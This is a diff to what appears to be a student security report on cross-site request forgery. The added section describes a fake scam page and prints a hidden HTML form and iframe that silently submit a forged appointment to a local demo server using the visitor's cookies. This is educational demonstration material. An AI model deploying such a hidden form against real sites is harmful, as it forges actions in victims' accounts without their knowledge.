@@ -8,10 +8,6 @@
 
 ---
 
-
-
-
-
 ## Index
 
 1. Introduction
@@ -261,6 +257,26 @@ To prevent CSRF attacks, web developers can implement measures such as using ant
 For the purposes of this assignment, we chose to implement a fake, scam site, that would resemble the overall appearance of our real site, enough so that at least some more naïve users would fall for, as seen below:
 
 ![](https://media.discordapp.net/attachments/852109272262770710/1070352387778293882/image.png?width=1294&height=661)
+
+In reality, it hides a malicious intent, implemented with the following hidden input, that is submitted when the user clicks the button:
+
+```html
+    <form hidden id="hack" target="csrf-frame" action="http://127.0.0.1:5000/appointment" method="POST"
+        autocomplete="off">
+
+        <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject"
+            value="Pain in the Arse" />Pain in the Arse
+
+        <textarea name="description" class="form-control" id="message" cols="30" rows="4"
+            placeholder="Message">HACKED!</textarea>
+
+        <input type="date" class="form-control" name="date" id="date" placeholder="Date" value="2024-12-12" />
+
+        <input type="time" class="form-control" name="time" id="time" placeholder="Time" value="14:12" />
+    </form>
+
+    <iframe hidden name="csrf-frame" id="frame" width="1000px" height="1000px"></iframe>
+```
 
 It appears to offer free checkups, but in reality, when clicked on, will make use of the user's stored cookies in order to inject a ficticious appointment in their account, as seen on the bottom of this user's appointment list:
 
